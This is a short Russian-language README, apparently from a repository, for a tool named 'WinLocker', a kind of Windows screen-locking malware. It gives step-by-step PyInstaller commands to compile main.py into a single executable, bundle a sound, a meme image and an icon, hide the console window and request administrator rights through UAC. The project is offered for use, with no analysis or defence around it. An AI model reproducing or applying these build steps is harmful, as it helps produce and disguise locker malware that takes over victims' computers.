# winlocker
для запуска вам необходимо компилировать файл в exe используя библиотеку pyinstaller
pip install pyinstaller
cd путь_к_папке_с_файлом
pyinstaller --onefile main.py

КАК ДОБАВИТЬ ЗВУК,КАРТИНКУ и лого

1. вы должны создать папку
2. скачайте мой файл и закиньте в папку
3. найдите лого
4. скачайте лого
5. переименуйте в logo.ico
6. закиньте в папку с main.py
7. скачайте любой понравившийся звук
8. закиньте в папку с main.py
9. переименуйте звук в sound.mp3
10. скачайте любую картинку
11. закиньте в папку с main.py
12. переименуйте в meme.png
    
ПРОЦЕСС КОМПИЛЯЦИИ В exe СО ВСЕМ ВЫШЕ ПЕРЕЧИСЛЕННЫМ

1.откройте консоль и перейдите в эту папку используя cd

2.вставьте это: pyinstaller --onefile --noconsole --uac-admin -n "WinLocker" --add-data "sound.mp3;." --add-data "logo.ico;." --add-data "meme.png;." -i "logo.ico" main.py
